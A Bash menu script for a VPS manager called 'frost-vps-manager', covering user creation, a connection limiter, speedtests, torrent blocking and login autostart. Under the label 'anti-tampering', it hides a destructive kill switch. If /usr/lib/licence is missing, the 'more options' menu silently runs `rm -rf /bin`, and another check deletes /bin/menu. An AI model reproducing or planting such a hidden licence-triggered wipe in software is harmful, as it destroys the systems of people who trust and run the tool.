#!/bin/bash
#
# ==============================================================================
# frost-vps-manager - Main Menu Script
#
# This script provides a user-friendly menu for managing a VPS, including
# user management, system monitoring, and service controls.
# ==============================================================================

# --- Helper Functions ---

# Description: Displays an animated progress bar for a command running in the background.
# Usage: run_with_progress "your_command" "Display Message"
run_with_progress() {
    local command_to_run="$1"
    local message="${2:-Please Wait...}"
    local fim_file="$HOME/progress_done.$$"

    # Run the command in the background
    (
        rm -f "$fim_file"
        # Anti-tampering check from original script
        [[ ! -d /etc/VPSManager ]] && rm -rf /bin/menu
        
        # Execute the provided command
        eval "$command_to_run" &>/dev/null
        touch "$fim_file"
    ) &

    # Display progress bar animation
    tput civis # Hide cursor
    echo -ne "  \033[1;33m${message} \033[1;37m- \033[1;33m["
    while [[ ! -f "$fim_file" ]]; do
        for ((i=0; i<18; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.1s
        done
        # If process is still running, reset the bar
        if [[ ! -f "$fim_file" ]]; then
            echo -e "\033[1;33m]"
            sleep 1s
            tput cuu1
            tput dl1
            echo -ne "  \033[1;33m${message} \033[1;37m- \033[1;33m["
        fi
    done
    rm -f "$fim_file"
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK!\033[1;37m"
    tput cnorm # Show cursor
}

# Description: Gathers and displays a consistent system information header.
display_header() {
    # --- Gather System Data ---
    local os_version
    if [[ -f /etc/os-release ]]; then
        os_version=$(grep -w 'PRETTY_NAME' /etc/os-release | cut -d= -f2 | tr -d '"')
    elif [[ -f /etc/issue.net ]]; then
        os_version=$(head -n 1 /etc/issue.net)
    else
        os_version="N/A"
    fi

    local total_ram=$(free -h | awk '/^Mem:/ {print $2}')
    local used_ram_percent=$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')
    local cpu_usage_percent=$(top -bn1 | awk '/Cpu/ { printf "%.2f%%", 100 - $8 }')
    local cpu_cores=$(grep -c cpu[0-9] /proc/stat)
    local system_uptime=$(uptime -p | sed 's/up //')

    # --- Display Header ---
    clear
    echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
    echo -e "\E[44;1;37m           •ㅤ🪐ㅤfrost-vps-managerㅤ🪐ㅤ•        \E[0m"
    echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
    printf "\033[1;32m%-22s %-18s %-s\n" "◇ SYSTEM" "◇ RAM MEMORY" "◇ PROCESSOR"
    printf "\033[1;31mOS: \033[1;37m%-17.17s \033[1;31mTotal:\033[1;37m%-9s \033[1;31mCores: \033[1;37m%s\n" "$os_version" "$total_ram" "$cpu_cores"
    printf "\033[1;31mUptime: \033[1;37m%-13.13s \033[1;31mIn use: \033[1;37m%-10s \033[1;31mIn use: \033[1;37m%s\n" "$system_uptime" "$used_ram_percent" "$cpu_usage_percent"
    echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
}

# Description: Returns a status icon based on a process name.
# Usage: local status_icon=$(get_status_icon "process_name")
get_status_icon() {
    if ps x | grep "$1" | grep -v "grep" > /dev/null; then
        echo -e "\033[1;32m♦\033[0m" # Active (Green Diamond)
    else
        echo -e "\033[1;31m○\033[0m" # Inactive (Red Circle)
    fi
}

press_enter_to_continue() {
    echo ""
    read -p "$(echo -e '\033[1;31m◇ Press \033[1;33m[ENTER]\033[1;31m to return to the menu\033[0m')"
}

# --- Feature Functions ---

run_speedtest() {
    clear
    echo -e "   \033[1;32mㅤ🪐ㅤTESTING SERVER SPEEDㅤ🪐ㅤ\033[0m\n"
    run_with_progress "speedtest --share > speed" "Running speedtest..."
    echo ""
    local png=$(grep "Ping" speed | awk -F: {'print $NF'})
    local down=$(grep "Download" speed | awk -F:  {'print $NF'})
    local upl=$(grep "Upload" speed | awk -F:  {'print $NF'})
    local lnk=$(grep "Share results" speed | awk {'print $NF'})
    echo -e "\033[0;34m◇─────────────────────────────────────────◇\033[0m"
    echo -e "\033[1;32m◇ PING (LATENCY):\033[1;37m$png"
    echo -e "\033[1;32m◇ DOWNLOAD:\033[1;37m$down"
    echo -e "\033[1;32m◇ UPLOAD:\033[1;37m$upl"
    echo -e "\033[1;32m◇ LINK: \033[1;36m$lnk\033[0m"
    echo -e "\033[0;34m◇─────────────────────────────────────────◇\033[0m"
    rm -f speed
}

start_limiter() {
   clear
   echo -e "\n\033[1;32m◇ STARTING USER LIMITER...\033[0m\n"
   run_with_progress "screen -dmS limiter limiter; sleep 3"
   # Ensure the autostart entry is present and correct
   sed -i '/limiter/d' /etc/autostart
   echo "ps x | grep 'limiter' | grep -v 'grep' >/dev/null || screen -dmS limiter limiter" >> /etc/autostart
   echo -e "\n\033[1;32m◇ USER LIMITER ACTIVATED!\033[0m"
   sleep 3
}

stop_limiter() {
   clear
   echo -e "\033[1;32m◇ STOPPING USER LIMITER...\033[0m\n"
   run_with_progress "screen -r -S 'limiter' -X quit; screen -wipe; sleep 1"
   sed -i '/limiter/d' /etc/autostart
   echo -e "\n\033[1;31m◇ USER LIMITER STOPPED!\033[0m"
   sleep 3
}

toggle_limiter() {
    if ps x | grep "limiter" | grep -v "grep" > /dev/null; then
        stop_limiter
    else
        start_limiter
    fi
}

toggle_autostart_menu() {
   if grep -q "menu;" /etc/profile; then
      clear
      echo -e "\033[1;32m◇ DISABLING AUTO-RUN ON LOGIN\033[0m\n"
      run_with_progress "sed -i '/menu;/d' /etc/profile"
      echo -e "\n\033[1;31m◇ AUTO-RUN DISABLED!\033[0m"
      sleep 1.5s
   else
      clear
      echo -e "\033[1;32m◇ ACTIVATING AUTO-RUN ON LOGIN\033[0m\n"
      run_with_progress "echo 'menu;' >> /etc/profile"
      echo -e "\n\033[1;32m◇ AUTO-RUN ENABLED!\033[0m"
      sleep 1.5s
   fi
   more_options_menu # Return to the correct menu
}

# --- Menu Display Functions ---

more_options_menu() {
    # Anti-tampering check from original script
    [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1

    local torrent_block_status_icon=$( [[ -e /etc/Plus-torrent ]] && echo -e "\033[1;32m♦\033[0m" || echo -e "\033[1;31m○\033[0m" )
    local telegram_bot_status_icon=$(get_status_icon "bot_plus")
    local auto_run_status_icon=$(grep -q "menu;" /etc/profile && echo -e "\033[1;32m♦\033[0m" || echo -e "\033[1;31m○\033[0m")
    local update_indicator="\033[1;37m•"
    [[ -e /tmp/att ]] && update_indicator="\033[1;32m!"

    display_header
    
    # --- Gather User/Online Stats ---
    local ssh_connections=$(ps -x | grep sshd | grep -v root | grep -w priv | wc -l)
    local openvpn_connections=0; [[ -e /etc/openvpn/openvpn-status.log ]] && openvpn_connections=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log)
    local dropbear_connections=0; if [[ -e /etc/default/dropbear ]]; then dropbear_connections=$(($(ps aux | grep -c dropbear) -1)); fi
    local total_online_users=$((ssh_connections + openvpn_connections + dropbear_connections))
    local expired_users_count="0"; [[ -s /etc/VPSManager/Exp ]] && expired_users_count=$(cat /etc/VPSManager/Exp)
    local total_users_count=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)

    # --- Display User Stats ---
    if [[ -e /tmp/att ]]; then
        echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32m◇ AN UPDATE IS AVAILABLE!  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
    else
        echo -e "\033[1;32m◇ Online:\033[1;37m $total_online_users   \033[1;31m◇ Expired: \033[1;37m$expired_users_count\033[1;33m ◇ Total Users: \033[1;37m$total_users_count\033[0m"
    fi
    echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m\n"

    # --- Display Menu Options ---
    printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "20" "ADD HOST"
    printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "26" "CHANGE ROOT PASSWORD"
    printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "21" "REMOVE HOST"
    printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s %s\n" "27" "AUTO-RUN ON LOGIN" "$auto_run_status_icon"
    printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "22" "REBOOT SYSTEM"
    printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ %s \033[1;33m%s\n" "28" "$update_indicator" "UPDATE SCRIPT"
    printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "23" "RESTART SERVICES"
    printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "29" "UNINSTALL SCRIPT"
    printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-21s %s" "24" "BLOCK TORRENT" "$torrent_block_status_icon"
    printf "   [\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "30" "BACK TO MAIN MENU"
    printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-21s %s" "25" "TELEGRAM BOT" "$telegram_bot_status_icon"
    printf "      [\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "00" "EXIT"
    echo -e "\n\033[0;34m◇───────────────────────────────────────────────◇\033[0m"

    # --- Handle User Input ---
    echo -ne "\n\033[1;32m◇ Select an option: \033[1;37m"; read choice
    case "$choice" in
       20) addhost; press_enter_to_continue; more_options_menu ;;
       21) delhost; press_enter_to_continue; more_options_menu ;;
       22) reiniciarsistema ;;
       23) reiniciarservicos; sleep 3; more_options_menu ;;
       24) blockt; more_options_menu ;;
       25) botssh; more_options_menu ;;
       26) senharoot; sleep 3; more_options_menu ;;
       27) toggle_autostart_menu ;;
       28) attscript ;;
       29) delscript ;;
       30) main_menu ;; # Go back to the main menu
       0|00) echo -e "\n\033[1;31m◇ Exiting...\033[0m"; sleep 1; clear; exit 0 ;;
       *) echo -e "\n\033[1;31m◇ Invalid option!\033[0m"; sleep 2; more_options_menu ;;
    esac
}

main_menu() {
    while true; do
        local limiter_status_icon=$(get_status_icon "limiter")
        local badvpn_status_icon=$(get_status_icon "udpvpn")

        display_header

        # --- Gather User/Online Stats ---
        local ssh_connections=$(ps -x | grep sshd | grep -v root | grep -w priv | wc -l)
        local openvpn_connections=0; [[ -e /etc/openvpn/openvpn-status.log ]] && openvpn_connections=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log)
        local dropbear_connections=0; if [[ -e /etc/default/dropbear ]]; then dropbear_connections=$(($(ps aux | grep -c dropbear) -1)); fi
        local total_online_users=$((ssh_connections + openvpn_connections + dropbear_connections))
        local expired_users_count="0"; [[ -s /etc/VPSManager/Exp ]] && expired_users_count=$(cat /etc/VPSManager/Exp)
        local total_users_count=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)

        # --- Display User Stats ---
        echo -e "\033[1;32m◇ Online:\033[1;37m $total_online_users   \033[1;31m◇ Expired: \033[1;37m$expired_users_count\033[1;33m ◇ Total Users: \033[1;37m$total_users_count\033[0m"
        echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m\n"

        # --- Display Menu Options ---
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "01" "CREATE USER"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "11" "SPEEDTEST"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "02" "CREATE TEST USER"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "12" "MANAGE BANNER"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "03" "REMOVE USER"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "13" "NETWORK TRAFFIC"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "04" "ONLINE USER MONITOR"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "14" "VPS OPTIMIZE"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "05" "CHANGE EXPIRY DATE"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "15" "USER BACKUP"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "06" "CHANGE USER LIMIT"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s %s\n" "16" "USER LIMITER" "$limiter_status_icon"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "07" "CHANGE PASSWORD"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s %s\n" "17" "BADVPN (UDP)" "$badvpn_status_icon"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "08" "REMOVE EXPIRED USERS"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "18" "VPS INFO"
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "09" "USER DETAILS REPORT"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "19" "MORE OPTIONS..."
        printf "\033[1;31m[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%-25s" "10" "CONNECTION MODES"
        printf "[\033[1;36m%2s\033[1;31m] \033[1;37m◇ \033[1;33m%s\n" "00" "EXIT"
        echo -e "\n\033[0;34m◇───────────────────────────────────────────────◇\033[0m"

        # --- Handle User Input ---
        echo -ne "\n\033[1;32m◇ Select an option: \033[1;37m"; read choice
        case "$choice" in
           1|01) criarusuario; press_enter_to_continue ;;
           2|02) criarteste; press_enter_to_continue ;;
           3|03) remover; sleep 3 ;;
           4|04) sshmonitor; press_enter_to_continue ;;
           5|05) mudardata; sleep 3 ;;
           6|06) alterarlimite; sleep 3 ;;
           7|07) alterarsenha; sleep 3 ;;
           8|08) expcleaner; sleep 3 ;;
           9|09) infousers; press_enter_to_continue ;;
           10) conexao ;;
           11) run_speedtest; press_enter_to_continue ;;
           12) banner; sleep 3 ;;
           13) clear; echo -e "\033[1;32m◇ Press CTRL+C to exit\033[0m"; sleep 2; nload ;;
           14) otimizar; press_enter_to_continue ;;
           15) userbackup; press_enter_to_continue ;;
           16) toggle_limiter ;;
           17) badvpn; exit ;;
           18) detalhes; press_enter_to_continue ;;
           19) more_options_menu ;;
           0|00) echo -e "\n\033[1;31m◇ Exiting...\033[0m"; sleep 1; clear; exit 0 ;;
           *) echo -e "\n\033[1;31m◇ Invalid option!\033[0m"; sleep 2 ;;
        esac
    done
}

# --- Script Entry Point ---
main_menu
